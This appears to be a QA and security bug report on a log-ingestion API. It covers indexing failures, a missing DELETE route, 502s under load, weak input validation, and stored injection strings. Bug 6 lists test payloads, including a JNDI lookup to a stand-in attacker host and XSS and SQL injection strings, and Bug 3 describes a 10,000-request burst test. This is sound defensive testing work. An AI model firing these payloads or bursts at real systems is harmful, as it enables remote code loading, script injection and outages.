Bug 1 — Ingested logs never become queryable: sources stuck in "learning" forever

Severity: High
Type: Broken feature / data pipeline failure
Status: Confirmed (reproduced 3/3 on clean runs, 2026-08-17)

What happened:

I created JSON ingest sources via POST /api/v1/ingest/sources and sent valid log events to POST /api/v1/ingest/{sourceKey}. The API consistently returned:

{"accepted":1,"rejected":0,"rawFallback":0}

with HTTP 200. The source's lastEventAt updated. However, when I queried the same events via POST /api/v1/logs/query (e.g. host="<unique-marker>"), the response always returned:

{"resultType":"events","columns":[...],"rows":[],"tookMs":...}

Zero rows. Every JSON source remained status="learning" with mapping.fields = {} for 15–60+ seconds (and longer). Events were acknowledged at ingest but never became searchable.

What I tested:

1. Created a fresh JSON source (status initially learning).
2. POSTed a clean event with a unique host marker:
   {"event":"test","host":"rv3-host-...","message":"hello","level":"info","service":"qa","attrs":{"marker":"..."}}
3. Waited 15 seconds (also tried 60+ seconds in earlier runs).
4. GET /api/v1/ingest/sources — source still status=learning, lastEventAt set, errorCount=0.
5. POST /api/v1/logs/query with query host="<marker>" — rows=[].
6. Repeated 3 times with fresh sources. Same result every time.

Evidence (re-verification v3, 3 runs):

  Run 1: ingest=200 source=learning query=200 rows=0
  Run 2: ingest=200 source=learning query=200 rows=0
  Run 3: ingest=200 source=learning query=200 rows=0

Additional observation:
- CEF sources created with preset fortigate-cef become status=active immediately (mapping pre-filled).
- JSON sources without a complete mapping stay learning and events never appear in logs/query.
- POST /api/v1/ingest/sources/{key}/infer-mapping exists but does not appear to auto-run after accepted events.

Why this matters:

1. Core product failure — customers configure Integrations presets (FortiGate, CrowdStrike, Okta, CloudTrail, etc.) that all route through this same webhook path. They see "accepted" and believe logs are stored. They are not searchable.
2. Silent data loss from the user perspective — no errorCount increase, no status=error, no warning. The UI/API reports success while data is unusable.
3. Affects all 31 webhook-based Integration presets that use /api/v1/ingest/{sourceKey}, not only Collectors.
4. Incident investigation, log alerts, and SIEM workflows cannot work if events never index.

What the fix should look like:

1. Auto-run mapping inference when a source is in learning and receives events, then transition learning → active.
2. Or reject ingest with a clear error while mapping is incomplete, instead of accepting events that will never query.
3. Surface learning/indexing state in the source object (e.g. pendingEvents, lastIndexError).
4. Ensure accepted events are either indexed and queryable within a documented SLA, or returned as rejected with a reason.
5. Add an integration test: create source → ingest event with unique marker → query by host/marker → expect rows >= 1.

Bug 2 — No DELETE endpoint for ingest sources; sources can only be disabled, never removed

Severity: Medium
Type: Missing API / incomplete lifecycle
Status: Confirmed (OpenAPI + live DELETE 404, 2026-08-17)

What happened:

After creating many QA ingest sources, I attempted cleanup with:

DELETE /api/v1/ingest/sources/{sourceKey}

Every attempt returned:

HTTP 404
{"message":"Route DELETE:/api/v1/ingest/sources/{key} not found","error":"Not Found","statusCode":404}

The OpenAPI spec for /api/v1/ingest/sources/{key} only documents PATCH (no DELETE). The only way to free a connected-endpoint quota slot is:

PATCH /api/v1/ingest/sources/{key}
{"status":"disabled"}

Disabled sources remain in the list forever. Source keys cannot be reused for a clean re-create in the same way a true delete would allow. During testing the account hit:

HTTP 402
{"error":"Connected-endpoint limit reached (5/5). Upgrade to add more hosts, agents, or sources.","code":"ENDPOINT_LIMIT_REACHED"}

because earlier "cleanup" DELETEs silently did nothing (404), so quota was never freed until PATCH disabled.

What I tested:

1. OpenAPI inspection: paths for ingest sources = POST/GET /ingest/sources, PATCH /ingest/sources/{key}, POST .../infer-mapping, POST /ingest/{sourceKey}. No DELETE.
2. Live DELETE on existing keys → 404 route not found.
3. PATCH status=disabled → 200 {"ok":true,"version":1}; connectedEndpoints quota decreased (e.g. 5/5 → lower).
4. After disable, source still appears in GET /api/v1/ingest/sources with status=disabled.

Why this matters:

1. Free-plan connectedEndpointLimit is 5. Without DELETE, misconfigured sources permanently consume operational clutter and confuse operators.
2. Operators cannot fully remove a leaked or wrong source key from the inventory.
3. Any automation that assumes REST DELETE for cleanup will fail silently if it doesn't check status codes carefully.
4. Combined with Bug 1 (learning sources that never become useful), accounts can fill with dead sources that only disable — never remove.

What the fix should look like:

1. Implement DELETE /api/v1/ingest/sources/{key} (or {id}) with cascade of delivery/stats rows as appropriate.
2. Document whether DELETE frees the connected-endpoint quota immediately.
3. Optionally soft-delete with a retention window, but hard-delete must exist for GDPR/account hygiene.
4. Update OpenAPI responses to include 204/200 for DELETE and 404 for unknown key.
5. Dashboard Hosts/Sources UI should offer "Delete" not only "Disable".

Bug 3 — Origin returns 502 under extreme concurrent ingest load (rate limit exists but origin still fails)

Severity: Medium
Type: Availability / stability under load
Status: Confirmed (10,000 concurrent requests, 2026-08-17)

What happened:

Rate limiting on ingest is real (see measurement below). At high concurrency the API correctly returns 429 for many requests, but under a 10,000-concurrent burst a large fraction of requests returned Cloudflare 502 instead of a clean 429:

  LEVEL 10000:
    200 OK: 600
    429:    6117
    502:    3283  (~33% origin failure)

502 body: "error code: 502" (Cloudflare origin error).

What I tested:

Concurrency levels 200, 500, 1000, 2500, 5000, 10000 against fresh sources.

Results summary:

  LEVEL   200 OK   429    5xx
    200     200      0      0
    500     399    101      0
   1000       0   1000      0
   2500       0   2500      0
   5000       0   5000      0
  10000     600   6117   3283

Exact rate-limit measurement (headers + sequential):

  Response headers on successful ingest:
    x-ratelimit-limit: 600
    x-ratelimit-remaining: 148
    x-ratelimit-reset: 7

  On first 429 (sequential):
    body: {"error":"Rate limit exceeded, retry in 1 minute"}
    Retry-After: 11
    x-ratelimit-limit: 600
    x-ratelimit-remaining: 0
    x-ratelimit-reset: 11

Actual rate limit (confirmed from headers):

  - Limit: 600 requests per window
  - Window: ~60 seconds (body says "retry in 1 minute"; x-ratelimit-reset is seconds until reset)
  - Cooldown after exceed: ~1 minute
  - Headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, Retry-After

Note: An earlier intermediate conclusion of "no rate limiting" was incorrect — it was based on a 100-request burst below the threshold. With higher load and header inspection, the limit is clearly 600 / ~1 minute.

Why this matters:

1. 502s mean the origin failed to respond cleanly — not just "slow down". Under extreme load, legitimate traffic can fail with opaque gateway errors.
2. A noisy neighbor / abuse burst could degrade availability even while the rate limiter is partially working.
3. Clients that only handle 429 + Retry-After may not correctly back off on 502, causing retry storms.
4. Free-plan and paid customers sharing origin capacity need the edge to absorb overload without origin death.

What the fix should look like:

1. Ensure Cloudflare / edge rate limiting rejects excess traffic before it can crash the origin (prefer 429 over 502).
2. Load-test origin at and above the documented 600/min limit and confirm zero 502 under sustained overload.
3. Document the official limit: 600 requests per minute (per token/source as applicable), with Retry-After behavior.
4. Add circuit-breaking / queueing so accepted requests still get 200/202 or clean 429, never origin 502 under rate-limit pressure.
5. Surface rate-limit remaining in dashboard for integration operators.

Bug 4 — CEF-format sources accept non-CEF garbage with HTTP 200 and errorCount stays 0

Severity: Low
Type: Weak validation / silent data quality loss
Status: Confirmed (reproduced 3/3, 2026-08-17)

What happened:

I created a CEF source with preset fortigate-cef (format=cef). I then POSTed plain non-CEF text:

Content-Type: text/plain
Body: this is not cef at all

API returned:

HTTP 200
{"accepted":1,"rejected":0,"rawFallback":0}

Source errorCount remained 0. No rejection, no format error.

What I tested:

3 clean runs, each with a fresh fortigate-cef source. All three accepted non-CEF text as accepted=1.

Why this matters:

1. FortiGate / Palo Alto customers may misconfigure forwarders and ship wrong format.
2. System reports success; errorCount does not rise; operator has no signal that mapping will fail or data is useless.
3. Contaminates the log store with unparseable noise that still consumes quota (logsBytesUsed).

What the fix should look like:

1. For format=cef sources, validate CEF structure (e.g. starts with CEF: and required pipe fields).
2. Reject invalid CEF with 400 or return accepted=0, rejected=1 with a clear code (INVALID_CEF).
3. Increment errorCount / set status=error after N consecutive format failures.
4. Document expected Content-Type and CEF version in the Integration preset hint.

Bug 5 — Invalid log shapes (arrays of non-objects) silently accepted

Severity: Low
Type: Weak validation / silent acceptance
Status: Confirmed (reproduced 3/3, 2026-08-17)

What happened:

I POSTed a JSON array of non-objects to a JSON source:

[1, 2, 3, "str"]

API returned:

HTTP 200
{"accepted":4,"rejected":0,"rawFallback":0}

Four "events" accepted. No schema rejection.

What I tested:

3 runs, fresh JSON sources each time. Always 200 with accepted=4.

Related earlier observation (first run, not re-counted as separate bug):
- Wrong Content-Type text/plain on a JSON body was also accepted with 200.

Why this matters:

1. Misconfigured shippers can send wrong shapes and receive success.
2. accepted count is misleading for billing/usage and for operator debugging.
3. Downstream mapping/query (already broken for learning JSON sources) becomes harder to diagnose.

What the fix should look like:

1. Accept only object or array-of-objects for format=json/ndjson.
2. Reject primitives with 400 or accepted=0, rejected=N, code=INVALID_EVENT_SHAPE.
3. Optionally enforce Content-Type application/json for JSON sources (415 on mismatch).

Bug 6 — Injection payloads stored/accepted verbatim (XSS depends on UI sanitization)

Severity: Info (potential Stored XSS if UI does not escape)
Type: Security hygiene / output encoding dependency
Status: Confirmed API acceptance 3/3; UI render not verified in this report

What happened:

I sent classic injection strings as log field values (payload / message-like attrs). All returned HTTP 200 accepted:

  ${jndi:ldap://attacker.example.com/a}
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  ' OR '1'='1; DROP TABLE logs;--
  CRLF, null byte, Unicode bidi (RTLO), template-injection strings

Server-side behavior:
- No evidence of JNDI/LDAP outbound execution (Log4Shell-style) from the API response path.
- No SQL error suggesting server-side query injection from log fields.
- Payloads are accepted for storage as log content (expected for a log platform) but not sanitized at ingest.

Because Bug 1 prevented querying rows back reliably, end-to-end storage fidelity and dashboard render could not be fully proven via API. Manual UI verification is required.

What I tested:

3 runs × 4 payloads each, all HTTP 200 on ingest.

Why this matters:

1. A log platform must store malicious strings (that is real attacker traffic) — but the dashboard must HTML-escape on render to prevent stored XSS when an analyst views logs.
2. If the UI renders raw HTML from log fields, an attacker who can ship logs to a source can XSS every analyst viewing that stream.
3. Server-side not executing JNDI/SQLi is good; client-side encoding is still mandatory.

What the fix should look like:

1. Confirm React/Vue (or whatever dashboard stack) escapes all log field rendering by default.
2. Add a QA checklist: inject <script> and ${jndi:...}, open log viewer, confirm text is escaped and no script runs.
3. Set Content-Security-Policy on the dashboard as defense in depth.
4. Do not "sanitize away" log content at ingest (would destroy forensic value); fix at render time.

Additional notes (not separate bugs, for context)

1. Auth on ingest is correct:
   - No token → 401 Unauthorized
   - Invalid token → 401 Invalid token
   - Empty bearer → 401
   - Unknown source key → 404 unknown or disabled source
   Confirmed 3/3.

   - Payloads up to ~2 MB accepted in clean runs
   - 5 MB+ → 413 {"error":"Request body is too large"}
   - No OOM observed on 11 MB (rejected cleanly)

3. Malformed JSON is rejected cleanly:
   - Broken JSON / non-JSON → 400 {"error":"Malformed JSON in request body","code":"BAD_JSON"}

4. Intermittent 520 on medium payloads (100KB–2MB) seen once in the first noisy run was NOT reproduced in 3 clean re-verification runs. Not filed as a confirmed bug. Likely transient origin pressure from concurrent testing.

5. Earlier false finding "no rate limiting" is revoked. Actual limit from headers: x-ratelimit-limit: 600 per window (~1 minute).
